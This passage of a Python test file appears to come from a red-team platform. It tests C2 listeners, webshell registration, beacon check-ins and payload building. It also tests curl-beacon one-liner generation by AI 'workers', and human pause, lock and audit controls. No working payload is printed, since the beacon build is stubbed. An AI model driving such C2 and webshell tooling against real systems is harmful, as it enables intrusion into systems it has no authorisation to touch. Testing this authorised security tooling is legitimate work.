        headers={**worker_headers, "Content-Type": "application/octet-stream"},
        params={
            "filename": "operator-tool.bin",
            "name": "Operator Tool",
            "platform": "linux",
            "arch": "amd64",
            "listener_id": listener["id"],
        },
        content=content,
    )
    assert uploaded.status_code == 201
    file_payload = uploaded.json()["payload"]
    assert file_payload["metadata"]["original_filename"] == "operator-tool.bin"
    assert file_payload["metadata"]["sha256"] == hashlib.sha256(content).hexdigest()
    assert (
        db.output_root("c2") / "payloads" / file_payload["metadata"]["filename"]
    ).read_bytes() == content
    assert db.output_root("webshell").is_dir()
    assert client.get(file_payload["target"]).content == content

    snapshot = client.get(
        f"/projects/{project_id}/operations/snapshot",
        headers=worker_headers,
        params={"kinds": "c2_payload"},
    ).json()["resources"]
    assert {item["id"] for item in snapshot} == {command_payload["id"], file_payload["id"]}
    assert next(item for item in snapshot if item["id"] == command_payload["id"])["metadata"]["command"]

    assert client.delete(
        f"/projects/{project_id}/resources/{file_payload['id']}"
    ).status_code == 204
    assert client.get(file_payload["target"]).status_code == 404


def test_worker_snapshot_and_changes_reveal_human_webshell_and_c2_session(
    client: TestClient,
) -> None:
    project_id = create_project(client)
    listener_response = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "人工 Listener",
            "target": "0.0.0.0:8443",
            "status": "available",
            "metadata": {
                "listener_type": "http_beacon",
                "bind_host": "0.0.0.0",
                "bind_port": 8443,
                "callback_host": "c2.example.test",
            },
        },
    )
    listener = listener_response.json()["resource"]
    listener_token = listener_response.json()["secret_once"]
    worker_headers = {
        "X-RedTrace-Worker": "codex-1",
        "X-RedTrace-Task": "explore",
        "X-RedTrace-Intent": "i001",
    }

    snapshot = client.get(
        f"/projects/{project_id}/operations/snapshot",
        headers=worker_headers,
        params={"kinds": "webshell,c2_listener,c2_session,c2_payload"},
    )
    assert snapshot.status_code == 200
    snapshot_payload = snapshot.json()
    assert snapshot_payload["audit_cursor"] > 0
    assert [resource["id"] for resource in snapshot_payload["resources"]] == [listener["id"]]

    shell = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "webshell",
            "name": "人工新增 Shell",
            "target": "https://target.test/shell.php",
            "metadata": {"method": "POST", "command_param": "cmd"},
            "secret": {"password": "hidden"},
        },
    ).json()["resource"]
    checkin = client.post(
        f"/c2/checkin/{listener['id']}",
        headers={"X-RedTrace-Listener-Token": listener_token},
        json={
            "external_id": "human-added-host",
            "hostname": "human-added-host",
            "username": "operator",
            "os": "linux",
            "arch": "amd64",
            "capabilities": ["command"],
        },
    )
    assert checkin.status_code == 200

    changes_payload = client.get(
        f"/projects/{project_id}/operations/audit",
        params={"since": snapshot_payload["audit_cursor"]},
    ).json()
    assert changes_payload["audit_cursor"] > snapshot_payload["audit_cursor"]
    changes = changes_payload["events"]
    assert any(
        event["action"] == "resource.register" and event["resource_id"] == shell["id"]
        for event in changes
    )
    assert any(
        event["action"] == "c2.session_online"
        and event["resource_id"] == checkin.json()["session_id"]
        for event in changes
    )


def test_worker_builds_payload_with_worker_and_intent_attribution(
    client: TestClient,
    monkeypatch,
    tmp_path: Path,
) -> None:
    project_id = create_project(client)
    listener = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "HTTP Beacon",
            "target": "0.0.0.0:8443",
            "status": "available",
            "metadata": {
                "listener_type": "http_beacon",
                "bind_host": "0.0.0.0",
                "bind_port": 8443,
                "callback_host": "c2.example.test",
            },
        },
    ).json()["resource"]

    def fake_build_beacon(**_: object) -> Path:
        artifact = tmp_path / "worker-beacon"
        artifact.write_bytes(b"compiled")
        return artifact

    monkeypatch.setattr(operations_router, "build_beacon", fake_build_beacon)
    headers = {
        "X-RedTrace-Worker": "pi-1",
        "X-RedTrace-Task": "explore",
        "X-RedTrace-Intent": "i007",
    }
    oneliner = client.post(
        f"/projects/{project_id}/c2/payloads/oneliner",
        headers=headers,
        json={"listener_id": listener["id"], "kind": "curl_beacon"},
    )
    assert oneliner.status_code == 200
    assert f"/c2/checkin/{listener['id']}" in oneliner.json()["oneliner"]
    built = client.post(
        f"/projects/{project_id}/c2/payloads/build",
        headers=headers,
        json={
            "listener_id": listener["id"],
            "callback_url": "https://c2.example.test:8443",
            "os": "linux",
            "arch": "amd64",
        },
    )
    assert built.status_code == 201
    payload = built.json()["payload"]
    assert payload["created_by_type"] == "worker"
    assert payload["created_by"] == "pi-1"
    assert payload["worker"] == "pi-1"
    assert payload["intent_id"] == "i007"
    audit = client.get(f"/projects/{project_id}/operations/audit").json()["events"]
    build_event = next(event for event in audit if event["action"] == "c2.payload_build")
    assert build_event["actor_type"] == "worker"
    assert build_event["actor"] == "pi-1"
    assert build_event["detail"]["intent_id"] == "i007"
    oneliner_event = next(event for event in audit if event["action"] == "c2.payload_oneliner")
    assert oneliner_event["actor_type"] == "worker"
    assert oneliner_event["actor"] == "pi-1"


def test_human_can_pause_lock_cancel_and_audit_worker_operations(client: TestClient) -> None:
    project_id = create_project(client)
    plugin = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "plugin",
            "name": "scanner",
            "target": "https://plugin.test/run",
            "metadata": {"actions": ["scan"]},
            "secret": {"endpoint": "https://plugin.test/run", "token": "hidden"},
            "actor": "Alice",
        },
    ).json()["resource"]

    assert client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/worker-control",
        json={"paused": True, "actor": "Alice"},
    ).status_code == 200
    blocked = client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/tasks",
        headers={"X-RedTrace-Worker": "claude-1", "X-RedTrace-Task": "explore"},
        json={"action": "scan", "arguments": {}, "actor_type": "worker", "actor": "claude-1"},
    )
    assert blocked.status_code == 423

    client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/worker-control",
        json={"paused": False, "actor": "Alice"},
    )
    client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/lock",
        json={"actor_type": "human", "actor": "Alice"},
    )
    locked = client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/tasks",
        headers={"X-RedTrace-Worker": "claude-1", "X-RedTrace-Task": "explore"},
        json={"action": "scan", "arguments": {}, "actor_type": "worker", "actor": "claude-1"},
    )
    assert locked.status_code == 423

    audit = client.get(f"/projects/{project_id}/operations/audit").json()["events"]
    actions = {event["action"] for event in audit}
    assert {"resource.worker_pause", "resource.worker_resume", "resource.lock"} <= actions
